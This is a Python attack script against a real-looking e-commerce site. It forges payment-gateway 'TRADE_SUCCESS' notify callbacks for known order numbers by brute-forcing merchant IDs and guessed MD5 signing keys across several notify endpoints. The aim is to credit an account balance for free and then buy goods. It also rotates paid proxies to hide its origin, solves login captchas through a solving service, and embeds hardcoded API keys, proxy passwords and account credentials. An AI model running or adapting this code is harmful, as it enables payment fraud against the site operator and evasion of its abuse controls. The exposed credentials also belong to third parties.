#!/usr/bin/env python3
"""Forge epay notify on known recharge trade_nos; buy cheap tid=130 if balance allows."""
import hashlib
import json
import itertools
import re
import subprocess
import time
import urllib.parse
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path("/tmp/qq1_deep9")
LOG = OUT / "notify_buy.log"
HITS = OUT / "hits.jsonl"
JAR = str(OUT / "nb.jar")
KEY = "685ea1068774ca8f8e9a292a08da66d6"
QG, PW = "C413ED6D", "344F550A6F8B"
USER, PASS = "p4764923", "Test64923x"
_px = None

# known recharge trade nos from previous run
ORDERS = [
    ("20260723081146592", "1", "alipay"),
    ("20260723081159777", "0.01", "alipay"),
    ("20260723081205232", "0.01", "qqpay"),
    ("20260723081216881", "10", "alipay"),
    ("20260723081228765", "189", "alipay"),
]


def log(m):
    line = f"[{datetime.now():%H:%M:%S}] {m}"
    print(line, flush=True)
    open(LOG, "a").write(line + "\n")


def hit(kind, detail, body=""):
    open(HITS, "a").write(json.dumps({"kind": kind, "detail": detail, "body": (body or "")[:8000]}, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:300]}")


def fresh():
    global _px
    for area in ("440000", "0"):
        try:
            d = json.loads(subprocess.check_output(
                ["curl", "-s", "--max-time", "10", f"https://share.proxy.qg.net/query?key={QG}"],
                text=True, timeout=12))
            if d.get("code") != "SUCCESS" or not d.get("data"):
                d = json.loads(subprocess.check_output(
                    ["curl", "-s", f"https://share.proxy.qg.net/get?key={QG}&num=1&area={area}"],
                    text=True, timeout=12))
            for x in d.get("data") or []:
                cand = f"http://{QG}:{PW}@{x['server']}"
                code = subprocess.run(
                    ["curl", "-sk", "--max-time", "10", "-x", cand, "-o", "/tmp/t9.out",
                     "-w", "%{http_code}", f"{BASE}/%61pi.php?act=siteinfo"],
                    capture_output=True, text=True, timeout=14).stdout.strip()
                if code == "200" and b"sitename" in open("/tmp/t9.out", "rb").read():
                    _px = cand
                    log(f"px {x['server']}")
                    return _px
        except Exception as e:
            log(f"px {e}")
        time.sleep(0.5)
    return _px


def curl(url, post=None, mt=18):
    global _px
    if not _px:
        fresh()
    for _ in range(5):
        cmd = ["curl", "-sk", "--max-time", str(mt), "-x", _px, "-b", JAR, "-c", JAR,
               "-A", "Mozilla/5.0", "-H", "Referer: https://qq1.lol/",
               "-w", "\n__HTTP:%{http_code}"]
        if post is not None:
            body = urllib.parse.urlencode(post) if isinstance(post, dict) else str(post)
            cmd += ["-X", "POST", "--data-binary", body,
                    "-H", "Content-Type: application/x-www-form-urlencoded"]
        cmd.append(url)
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 8).stdout or ""
        if "authorization expired" in out or "__HTTP:" not in out:
            fresh()
            continue
        b, code = out.rsplit("__HTTP:", 1)
        return b.strip(), code.strip()
    return "", "000"


def signs(params, key):
    items = sorted((k, str(v)) for k, v in params.items() if k not in ("sign", "sign_type") and v != "")
    s = "&".join(f"{k}={v}" for k, v in items)
    cands = [
        hashlib.md5((s + key).encode()).hexdigest(),
        hashlib.md5((s + "&key=" + key).encode()).hexdigest(),
        hashlib.md5((key + s).encode()).hexdigest(),
        hashlib.md5(f"{params.get('pid','')}{params.get('out_trade_no','')}{params.get('money','')}{key}".encode()).hexdigest(),
        hashlib.md5(f"{params.get('pid','')}{params.get('trade_no','')}{params.get('money','')}{key}".encode()).hexdigest(),
    ]
    return cands


def forge_one(tn, money, typ):
    pids = ["1000", "1001", "1", "10001", "8888", "2024", "100", "10"]
    keys = ["", "123456", "key", "epay", "qq1", "buyi", "qqkqq", "faka", "caihong",
            "admin", "password", "1234567890", "ABCDEF", USER, PASS, "qq1.lol",
            "1", "0", "test", "md5", "secret"]
    paths = [
        "/other/epay_notify.php",
        "/other/epay_return.php",
        "/other/alipay_notify.php",
        "/other/qqpay_notify.php",
        "/other/wxpay_notify.php",
        "/other/notify.php",
    ]
    tried = 0
    for pid, key in itertools.product(pids, keys):
        base = {
            "pid": pid,
            "trade_no": tn,
            "out_trade_no": tn,
            "type": typ,
            "name": "在线充值余额",
            "money": money,
            "trade_status": "TRADE_SUCCESS",
        }
        for sign in signs(base, key):
            p = dict(base)
            p["sign"] = sign
            p["sign_type"] = "MD5"
            for path in paths:
                b, c = curl(BASE + path, p)
                tried += 1
                if not b:
                    continue
                low = b.strip().lower()
                if low in ("success", "ok", "success\n") or low == "success":
                    hit("NOTIFY_OK", f"{path} tn={tn} pid={pid} key={key!r}", b)
                    return True
                if "签名失败" not in b and "error" not in low and "fail" not in low and "不正确" not in b:
                    if len(b) < 100:
                        log(f"  odd {path} pid={pid} key={key!r}: {b[:80]}")
            # also GET
            b, c = curl(BASE + "/other/epay_notify.php?" + urllib.parse.urlencode(p))
            tried += 1
            if b and b.strip().lower() == "success":
                hit("NOTIFY_OK_GET", f"tn={tn} pid={pid} key={key!r}", b)
                return True
        if tried % 200 == 0:
            log(f"  forged {tried} attempts on {tn}...")
    log(f"forge miss {tn} tried~{tried}")
    return False


def login():
    Path(JAR).unlink(missing_ok=True)
    curl(BASE + "/user/login.php")
    for attempt in range(5):
        try:
            cap_b, _ = curl(BASE + f"/ajax.php?act=captcha&t={int(time.time()*1000)}")
            cap = json.loads(cap_b)
            task = {"type": "GeeTestTaskProxyless", "websiteURL": BASE + "/user/login.php",
                    "gt": cap["gt"], "challenge": cap["challenge"]}
            d = json.loads(subprocess.check_output(
                ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
                 "-d", json.dumps({"clientKey": KEY, "task": task}),
                 "https://api.2captcha.com/createTask"], text=True, timeout=35))
            if d.get("errorId"):
                raise RuntimeError(str(d))
            tid = d["taskId"]
            log(f"task {tid}")
            sol = None
            for _ in range(35):
                time.sleep(4)
                d = json.loads(subprocess.check_output(
                    ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
                     "-d", json.dumps({"clientKey": KEY, "taskId": tid}),
                     "https://api.2captcha.com/getTaskResult"], text=True, timeout=25))
                if d.get("status") == "ready":
                    sol = d["solution"]
                    break
                if d.get("errorId"):
                    raise RuntimeError(str(d))
            if not sol:
                continue
        except Exception as e:
            log(f"cap {e}")
            continue
        b, c = curl(BASE + "/user/ajax.php?act=login", {
            "user": USER, "pass": PASS,
            "geetest_challenge": sol.get("challenge") or cap["challenge"],
            "geetest_validate": sol.get("validate", ""),
            "geetest_seccode": sol.get("seccode") or (sol.get("validate", "") + "|jordan"),
        })
        log(f"login {c} {(b or '')[:160]}")
        if b and ("成功" in b or '"code":0' in b):
            return True
    return False


def main():
    open(LOG, "w").write("")
    log("=== NOTIFY + BUY ===")
    fresh()

    # API pay cheap first (shows balance gap)
    for tid in ("130", "140", "141", "71"):
        b, c = curl(f"{BASE}/%61pi.php?act=pay", {
            "user": USER, "pass": PASS, "tid": tid, "num": "1", "input1": "nb@" + USER,
        })
        log(f"api pay tid={tid}: {c} {(b or '')[:220]}")
        if b and "余额不足" not in b and ("成功" in b or "kami" in b or "card" in b or '"code":0' in b):
            hit("BUY_OK", tid, b)

    # forge notifies
    for tn, money, typ in ORDERS:
        log(f"forging {tn} money={money}")
        if forge_one(tn, money, typ):
            break
        time.sleep(0.2)

    # check balance via login
    if login():
        home, _ = curl(BASE + "/user/")
        m = re.search(r"余额：([0-9.]+)元", home or "")
        bal = m.group(1) if m else "?"
        log(f"balance={bal}")
        if bal != "?" and float(bal) >= 0.5:
            hit("BALANCE_OK", bal, home[:300])
            b, c = curl(f"{BASE}/%61pi.php?act=pay", {
                "user": USER, "pass": PASS, "tid": "130", "num": "1", "input1": "got@" + USER,
            })
            log(f"buy 130: {c} {(b or '')[:300]}")
            if b and "余额不足" not in b:
                hit("CARD_OR_ORDER", "130", b)

    log("=== DONE ===")


if __name__ == "__main__":
    main()
